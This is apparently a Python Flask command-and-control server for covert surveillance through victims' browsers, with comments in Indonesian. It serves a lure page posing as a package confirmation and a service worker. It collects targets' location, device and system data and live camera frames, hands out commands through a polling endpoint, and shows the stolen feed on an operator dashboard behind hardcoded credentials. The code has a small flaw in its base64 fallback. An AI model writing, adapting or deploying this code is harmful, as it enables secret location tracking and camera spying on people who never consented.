import os
from flask import Flask, request, redirect, jsonify, render_template

app = Flask(__name__)

# Konfigurasi Berkas Penyimpanan Data di VPS
LOG_FILE = "sinkronisasi_log.txt"
FRAME_FILE = "latest_frame.txt"

# Menentukan instruksi aktif yang dikirimkan ke peramban target
# Opsi perintah: ambil_lokasi, cek_baterai, ambil_data_sistem, ping_test
CURRENT_COMMAND = "ambil_lokasi"

@app.route('/')
def home():
    return "Gear99 Core Server Active", 200

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/static/sw.js')
def serve_sw():
    return app.send_static_file('sw.js'), 200, {'Content-Type': 'application/javascript'}

# ==========================================
# 1. API: MENERIMA KOORDINAT & STATUS TARGET
# ==========================================
@app.route('/api/kirim-data', methods=['POST'])
def terima_data():
    try:
        data = request.json
        if data:
            status_perangkat = data.get('status', 'Unknown')
            info_tambahan = data.get('info', 'No details')
            
            with open(LOG_FILE, "a") as f:
                f.write(f"SINKRONISASI -> Status: {status_perangkat} | Detail: {info_tambahan}\n")
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "failed"}), 400

# ==========================================
# 2. API: MEMPROSES ALIRAN FRAME GAMBAR LIVE
# ==========================================
@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    try:
        data = request.json
        if data and 'frame' in data:
            # Menyimpan string base64 frame terbaru ke berkas teks di VPS
            with open(FRAME_FILE, "w") as f:
                f.write(data['frame'])
            return jsonify({"status": "frame_received"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "failed"}), 400

@app.route('/get_latest_frame')
def get_latest_frame():
    # Membaca frame terbaru untuk disemburkan ke elemen <img> dasbor
    if os.path.exists(FRAME_FILE):
        with open(FRAME_FILE, "r") as f:
            base64_data = f.read()
            # Jika format data URL valid, arahkan peramban untuk merendernya
            if "," in base64_data:
                import base64
                try:
                    header, encoded = base64_data.split(",", 1)
                    mime_type = header.split(";")[0].split(":")[1]
                    data_biner = base64.b64decode(encoded)
                    return data_biner, 200, {'Content-Type': mime_type}
                except:
                    pass
    # Mengembalikan gambar transparan 1x1 piksel jika belum ada frame yang masuk
    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}

# ==========================================
# 3. API: SINKRONISASI INSTRUKSI OPERATOR
# ==========================================
@app.route('/poll_command')
def poll_command():
    global CURRENT_COMMAND
    return jsonify({"command": CURRENT_COMMAND})

@app.route('/report_output', methods=['POST'])
def report_output():
    try:
        data = request.json
        if data and 'output' in data:
            with open(LOG_FILE, "a") as f:
                f.write(f"{data['output']}\n")
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "failed"}), 400

@app.route('/api/ambil-log')
def ambil_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            baris = f.readlines()
            return jsonify({"logs": baris[-12:]})
    return jsonify({"logs": ["Belum ada aktivitas sinkronisasi yang tercatat..."]})

# ==========================================
# 4. GERBANG MASUK & PANEL KENDALI UTAMA
# ==========================================
@app.route('/operator', methods=['GET', 'POST'])
def operator_panel():
    pesan_error = ""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == "admin" and password == "medusa123":
            return redirect('/operator/dashboard')
        else:
            pesan_error = "<p style='color: red;'>Kredensial Salah! Akses Ditolak.</p>"
            
    return f'''
    <html>
        <head><title>Gear99 - Dual Active Operator</title></head>
        <body style="background-color: #0b0c10; color: white; font-family: sans-serif; padding: 50px;">
            <h2>[ GEAR99 LAB AUTH ]</h2>
            {pesan_error}
            <form method="POST" action="/operator">
                <p>Username: <input type="text" name="username" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <p>Password: <input type="password" name="password" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <input type="submit" value="Masuk Panel" style="background: #45f3ff; color: black; border: none; padding: 5px 15px; cursor: pointer;">
            </form>
        </body>
    </html>
    '''

@app.route('/operator/dashboard')
def operator_dashboard():
    return '''
    <html>
        <head>
            <title>Gear99 - Main Control Room</title>
            <script>
                function perbaruiDasbor() {
                    // 1. Ambil log teks otomatis
                    fetch('/api/ambil-log')
                        .then(response => response.json())
                        .then(data => {
                            let logKontainer = document.getElementById("log-stream");
                            logKontainer.innerHTML = "";
                            data.logs.forEach(log => {
                                let p = document.createElement("p");
                                p.style.margin = "5px 0";
                                p.style.borderBottom = "1px solid #252830";
                                p.style.paddingBottom = "3px";
                                p.innerText = log;
                                logKontainer.appendChild(p);
                            });
                        })
                        .catch(err => console.error("Gagal memuat log:", err));
                    
                    // 2. Refresh frame gambar visual secara live
                    document.getElementById("live-stream-view").src = "/get_latest_frame?" + new Date().getTime();
                }
                
                setInterval(perbaruiDasbor, 1500);
                window.onload = perbaruiDasbor;
            </script>
        </head>
        <body style="background-color: #0b0c10; color: #45f3ff; font-family: monospace; padding: 30px;">
            <h2>[ GEAR99 CENTRAL LAB CONTROL - CORE STREAM ]</h2>
            <hr style="border: 1px solid #1f2833;">
            <p style="color: #66fcf1;">Status Server: <span style="color: lightgreen;">ONLINE</span></p>
            <p style="color: #66fcf1;">PWA Service Worker: <span style="color: lightgreen;">BOUND (ACTIVE)</span></p>
            
            <div style="margin-bottom: 25px;">
                <strong>[ LIVE VISUAL FEED ]</strong><br><br>
                <img id="live-stream-view" src="" style="width: 320px; height: 240px; border: 2px solid #45f3ff; background: #1f2833; border-radius: 5px;" alt="Menunggu aliran visual...">
            </div>

            <div style="background: #1f2833; padding: 20px; border-radius: 5px; color: white; min-height: 150px;">
                <strong>[ LOG STREAM DATA INCOMING ]</strong>
                <div id="log-stream" style="margin-top: 15px; color: #a9eed1;">
                    Menghubungkan ke server log...
                </div>
            </div>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
